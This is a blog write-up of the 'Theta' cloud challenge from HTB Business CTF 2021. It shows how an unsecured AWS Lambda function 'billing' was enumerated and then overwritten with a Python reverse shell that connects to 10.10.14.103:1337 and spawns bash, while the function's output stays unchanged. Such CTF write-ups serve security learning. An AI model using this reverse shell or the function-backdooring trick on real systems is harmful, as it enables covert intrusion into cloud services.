---
layout: post
title:  "HTB Business CTF 2021 - Theta writeup"
date:   2021-07-27 20:00:00 +0300
categories: HTB_Business_CTF_2021 CTF
summary: Writeup for the Theta challenge from HTB's Business CTF from 2021. This challenge involved a unsecured aws Lambda service.
---

[Theta](https://ctftime.org/task/16672) was a challenge at the HTB Business CTF 2021 from the 'Cloud' category. It involved a unsecured AWS Lambda service that could be exploited in order to obtain code execution on the server the service was running on.

### Recon & identifying the service

After we spawned the container for this challenge we got an IP and a port (4566).  
By accessing that using a browser, we could see a JSON response.

![JSON response]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/theta_http.png){: .center-image}

This looked similar to what I've seen before (for example, while attacking HTB's [Bucket]({{site.baseurl}}/HTB-Bucket-writeup) machine) so the first thing that I tried was accessing the /health endpoint.  

![Health response]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/theta_health.png){: .center-image}

This shows us what services are running on this machine.  
Lambda seems like the best one to target because it deals with executing code.  

### AWS Lambda

We can now configure AWS cli and use that to interact with the Lambda service.  
First, we'll try to list the existing functions. We see that there is a single registered function called 'billing'.

![Listing functions]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/theta_list_fct.png){: .center-image}

My next step was trying to create a new function but I was unable to do that.  
Instead, I continued by trying to get more information about the existing function.

### Obtaining the code of the 'billing' function

You can get more details about a function by using 'get-function'.  
This have us access to the code location for the 'billing' function.

![Details for the billing function]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/theta_code_location.png){: .center-image}

By accessing that URL we got an archive that contained a single python file, lambda_function.py

<p>
{% highlight python %}
import json

def lambda_handler(event, context):
    return {
        'statusCode': 200,
        'body': json.dumps('Still in development')
    }

{% endhighlight %}
</p>

The function does not do anything, it just returns 'Still in development'.

### Updating the function, getting a shell and obtaining the flag

My next step was trying to update the 'billing' function. If I cannot create a new function, maybe I can edit an existing one.  
I edited the function above and made it return a slightly different message, zipped the modified file and then updated the function using the zip archive.  

![Updating the function]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/theta_update.png){: .center-image}

When invoking the function, I could see the message being changed.  
But we're here to hack something, so let's put in a reverse shell and see if that works.

<p>
{% highlight python %}
import json
import socket,subprocess,os

def lambda_handler(event, context):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.103",1337))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"])
    
    return {
        'statusCode': 200,
        'body': json.dumps('Still in development')
    }

{% endhighlight %}
</p>

I added a simple reverse shell in the function while keeping the returned message identical.  
Then, I opened a listener on my machine and invoked the 'billing' function (using curl).

![Invoking the function]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/theta_invoke.png){: .center-image}

This worked and I got a shell on the machine. It seemed like this is not a challenge with multiple steps like the usual HTB Machines (these were in a different category) so I just ran a grep looking for the flag.  
The flag was 'hidden' in /opt/flag.txt.

![Obtaining the flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/theta_flag.png){: .center-image}